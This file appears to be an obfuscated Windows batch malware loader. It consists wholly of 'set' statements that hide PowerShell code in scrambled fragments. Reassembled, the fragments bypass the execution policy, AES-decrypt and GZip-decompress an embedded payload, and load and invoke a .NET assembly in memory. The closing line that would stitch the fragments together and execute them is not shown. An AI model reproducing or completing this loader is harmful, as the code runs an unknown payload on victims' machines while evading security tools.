@echo off
set "MCzpacHnfX=he"
set "VdJmAgZCeV=rS"
set "MwwCvpHsNg=ll"
set "CemKGNsdLg= C"
set "tyHpFIlCvP= /"
set "LfhkBbpIMA=co"
set "uLSwzHSxEO=nd"
set "PmsrnjfXvR=ll"
set "rFNdDFXMjg=xe"
set "nddBfOWEgx=\W"
set "ADKghdrFAD=Po"
set "zpNsEXzFOD=:\"
set "PhmfrxhRDA=em"
set "ZiodgpCsFz=py"
set "QXEbSZaVow=s\"
set "vrAcHxUyFa=\v"
set "MJBWiIKrYq=0\"
set "XmDcyLdLaD=ws"
set "yKJJNcUHkn=he"
set "GDdqvkdKoh=Wi"
set "dxQNbOySeG=y "
set "tCFDHCvJmo=in"
set "ImXFaKuWyj=ow"
set "abgnAhjHbq=po"
set "GFNrqhSTUT=do"
set "FNhGGHqLkX=we"
set "XXeGktWpjO=.e"
set "fHfReLPDUY=rs"
set "ebaZVuFxpL=st"
set "iwbjibLNns=we"
set "eOBFeVexSE=1."
set "GXjhfbxtUn=32"
set "JHODLNwrSX=Sy"
set "OoWCDHZzqx= %~dp0"
set "oGILfYeCCo=cd"
set "jGoufBXEAK=7;$O"
set "WlmAZqHvsd=k; }"
set "AqzsfzcvPc=rans"
set "PhVmHoJApj=stem"
set "JOFhxcJXxf=Secu"
set "vpgZrEaQFn=esFX"
set "BucAIzAout= = $"
set "UlKVgLgIBM=ay()"
set "sDvNQmYjhV=ose("
set "SBpGkqBKfh=UefZ"
set "yNiHsnDIvZ=Rv.D"
set "dpCiNbLSQj=tryP"
set "YkOejJJRTl=le  "
set "gggZeYURrn=v = "
set "foSFqsYtzL=yste"
set "KTvDldYNzS=n ''"
set "soaHYzSheb=XsIk"
set "GbjrAPleMx=+hAO"
set "CkKmafvChM=tS46"
set "trXKHoRjMd=; };"
set "ZgWnnwayee='[-1"
set "QgvzWAHFLA=pres"
set "QJLOhjCeuZ=-Obj"
set "GAOihgKNxr=]::C"
set "lSSJHYFFZV=::('"
set "APFrSUQWZM=kw);"
set "PGeEWRABUC=-4] "
set "xMnIZehfPp== [S"
set "RNWmZLGVWK=esaB"
set "fIWihroTQA=.Key"
set "vlsgjRRZgp=sIkw"
set "UWucxZyQzn= [st"
set "lxUOxETdwo=and "
set "aRKpjjQziA=736u"
set "PiIRXxGxmG=6esa"
set "TtfkSSqENU=grap"
set "WXSfBYGbje=vert"
set "PcFbFvepuJ= [Sy"
set "WwWXNrEpRP=16] "
set "ZqXsMkdizk=UefZ"
set "eZhxrVMnJn=oL'["
set "xHwiFpaUGr=, (,"
set "yhgayRvrpo=ect "
set "CaBcKHmMiR=ose("
set "FUroaJBAIU=)($h"
set "WzsbLQiJdz=rt]:"
set "OmIFIQYVbd=ionM"
set "QMxYyaboIF=brea"
set "VDhjKiHeII=.Mem"
set "vGDkKkEHTr=ert]"
set "VXZBMsqtDt=-1.."
set "qtVMMCIcwQ=ptog"
set "mVJitxpVdS=::De"
set "jRBFUwkSWE=stem"
set "upPevKaPde=t Sy"
set "WrxWsvbGgL=V = "
set "kNUmUfTckO=yste"
set "NOUVztDmXG=ode]"
set "PDUAxdintw=[Sys"
set "REMlRMjLkS=form"
set "lBZWwIqlUh=NSIt"
set "HbMMUPdBcl=orF'"
set "IshAUpiSLp=[IO."
set "JARTNsQOqv=:('g"
set "zvpnGSfDos=Secu"
set "rQDioXovTu=ress"
set "pfhaYdBGwT=m.IO"
set "kkpVuBPoxd=OSQf"
set "PkELJsiYaT= = N"
set "fFkSAMTSXf=();$"
set "TQqxrKBVbW=]::("
set "DhSWudduSf=gMod"
set "bSjvscZhhn=iron"
set "edfZvwXCbd=-joi"
set "yCuAKSkDKC=Mode"
set "EdyFsSLFSk=m.IO"
set "gxHOfzwzZw=;$eg"
set "MFgmRcmoke=w = "
set "qbmhMHApUv=nage"
set "AFORclhFXj=pher"
set "izKHJsTeBz=Itj "
set "aYRKwwGeVH=.Con"
set "rIqCRNWWWF=Disp"
set "giMzNOOypt=).Sp"
set "ZhxTsnsuAp=, $X"
set "lYHjxHwPVG=srOv"
set "OcUrXCqGYq=ne);"
set "rZhpPTBrvx=ZYYc"
set "xXPoMCqqSg=ispo"
set "tuQzeUffas=.Dis"
set "VxxTLjKKxX=sIkw"
set "pDldwmRRzg=mory"
set "fravrKJkJR=ewLi"
set "DUqBVCakzW=jd.T"
set "VjxfyOjBkJ=UefZ"
set "SFGXanCYWu=S46e"
set "QrHtEKZXOb=Star"
set "PqtjapYuLF=$cHP"
set "fDzkUNYQdr=3HWs"
set "YhGLwAoSfG=sGUc"
set "VwWQCegbJA=Disp"
set "SZeSosUFNx=ss -"
set "LytXzPaqci=tion"
set "GCruxPvfYs=]::("
set "fTzzxZBgYL=q = "
set "DXRvowsAUv=.Cop"
set "dbiVTYHIsJ=OyzA"
set "YaxsodCice=Fina"
set "kZQIqPXhQr=isfL"
set "zKHdRYhfKj=ck($"
set "bdFdhMrWsO=$ENK"
set "lTYgQrLmFb=-joi"
set "xYUgVqIxtU=  $h"
set "gqYmPtalXq=sion"
set "dwnNqSAQxI=raph"
set "EomphhGtTz=$cHP"
set "VEANwXgVgK=);$O"
set "GKCLnKfegb=comm"
set "NeASbQEJNA=v4Ir"
set "cEROqauERd=ew-O"
set "kaVKfKhFfa=oin "
set "KAbuDvqIEH=$XsI"
set "iIYmObpDtt=.Com"
set "xdEADkPmTf=Obje"
set "IGDLQuYyKo=qF);"
set "lEtqYkhldD=3); "
set "VDZLkrmmaP=Invo"
set "sacMeMlTme=saBm"
set "lQegbZeUvC=[Sys"
set "qjpAqWwyvw=xWc."
set "kAANhzsOPM=New-"
set "gfmUaYUBkc=ptor"
set "KGXmvFrWxK=.Len"
set "zWiJiqxfPi=hy.A"
set "SNcchpOBxX=exWc"
set "aFAMnvKhqN=y.Cr"
set "mXRqyNOMsG=urit"
set "pSbWamXtrS=qF.T"
set "CjBtlTEjmF=;$sr"
set "mtuEPNSvmo= if "
set "MjrtNUcRFX=ress"
set "DdxndmoPUv=..-1"
set "SNppVXBWkg=ress"
set "EzEEIQBXCg=Conv"
set "bIcdBFIwxU=[Env"
set "hrnitufpBd='txe"
set "nulHIIjqZT=x.En"
set "xBSQEskkyM=yjd."
set "etBDPECqkV=Gjmk"
set "ZEztJoMOZw=BC;$"
set "LYMSWwvQEl=tem."
set "sXHEdjEqXn===')"
set "ojXnwJPWqh=y.Ci"
set "reZbZKJnkc== $O"
set "jhvQYzBAPG=nirt"
set "DKGvLyGBoP=G) {"
set "nKZPEDDjSZ=ring"
set "TQlxoKONmY=am;$"
set "etYoqAHgvh=);$c"
set "UjzYZZsUKE=rity"
set "VDgZFLKLXF==');"
set "BcRjxIoISh=mPRv"
set "PWwZOddznG=yste"
set "lWXHgkDIdu=morF"
set "TnutQCgxgJ=$egy"
set "CPWdGqwTQb=0O+g"
set "kFoUVNkYZr=New-"
set "TZGQJhjuRa=;$Xe"
set "BJuWEcQFxY=kG ="
set "xKsvxCNbor=lBlo"
set "EykdrpLFmb=Comp"
set "esmzHOXgRf=($NS"
set "BuAGbGzjkt=HPqF"
set "YBZNbPObai=.Dis"
set "sgfZVlkKZv=TllA"
set "uOoDCyVDAA=)($X"
set "TkALnRMeYu=bstr"
set "JcshvFndfQ=6] -"
set "DpAmeIIObW=Syst"
set "NYpaQczdal=n ''"
set "BMyNADYJxZ=join"
set "GGoRMIWfiR=ion."
set "ajMnoyfIYi=]::N"
set "mdPyhhYjkN=.GZi"
set "VAbrWbostJ=m.Re"
set "rGqMdljRLz=join"
set "WUsLFhmqOo=w, 0"
set "vWUWNRKLxv=eam("
set "loPmPahGIC='[-1"
set "NcHZNtgXsA=Stre"
set "AQWFGYpSME=1] -"
set "XjDvivpiul=-ep "
set "FeAldrPFuB=comp"
set "DrPKFHeHSP=tem."
set "aFJCPKBRlb=UefZ"
set "IzDygnsVZA=oryS"
set "HIuncDGlef=qF ="
set "yPuCgfAZzf=$XsI"
set "NtrKIUhLcQ=bypa"
set "DamuhhzJDU= '')"
set "zrhiYarzsx=.Cry"
set "ZEfbueyEbR=XsIk"
set "JPAUOsHwjx=y.Pa"
set "AtiGkTcaRv=ddin"
set "pHTwHdTUTA=[-1."
set "eSWsBwJmoM=Ovx "
set "VmSYfTQmXr=PKCS"
set "hEVXNxwMAl=ypto"
set "LhXfCObxXs=ENKu"
set "oErVRJQYan=7Yiv"
set "QhkudtpTJA=e = "
set "KuPQXHtiyQ='dqR"
set "aYpllLhRXr=('da"
set "AbFQcHZiII=$WmP"
set "CxuYLGldwG=uq, "
set "wfZsZxheRg=y]::"
set "iZTVBwnJVA=$OUe"
set "eftwnkwlPw=d;$O"
set "ChMsWNOEwi=ateD"
set "ueltFMKrBf=..-1"
set "oHoLYQSTdl=] -j"
set "CYOcsYfLhQ=$Gjm"
set "ndNaxyQchd=onve"
set "sbNkkXDsRs=trea"
set "CqLyadILzG=ke($"
set "PPMgnlUdrA=embl"
set "OzfUQjKIex=pStr"
set "pPLcgVxWsD=;$EN"
set "PxbMDxKaWB=.Mod"
set "pzilvXKblr=pose"
set "DDmvfIUXMw=WmPR"
set "Nziqvtglgt=fZ.I"
set "FNcPUxTWjQ=in $"
set "CJJWhqBvWl=-nop"
set "gQAOdhAVad=();$"
set "WxXTnhakJT=$cHP"
set "pmEdXjhWnp=UefZ"
set "NRhuxMIHEb=)))"
set "QYbcCGRfOj=1..-"
set "rvQraWaVll=OSQf"
set "ypMCRWKWLX=.Ass"
set "MRrvkkQhpK=gth)"
set "ubdCDdzVCr=pose"
set "HWKTOZrTqH=kw ="
set "ymlNAaRGJW=Z.Pa"
set "QSRVcieIMl=.-16"
set "ayDMsWHCxj=UGTu"
set "AAJjZKzOIT=th('"
set "gwDnquHmav=g = "
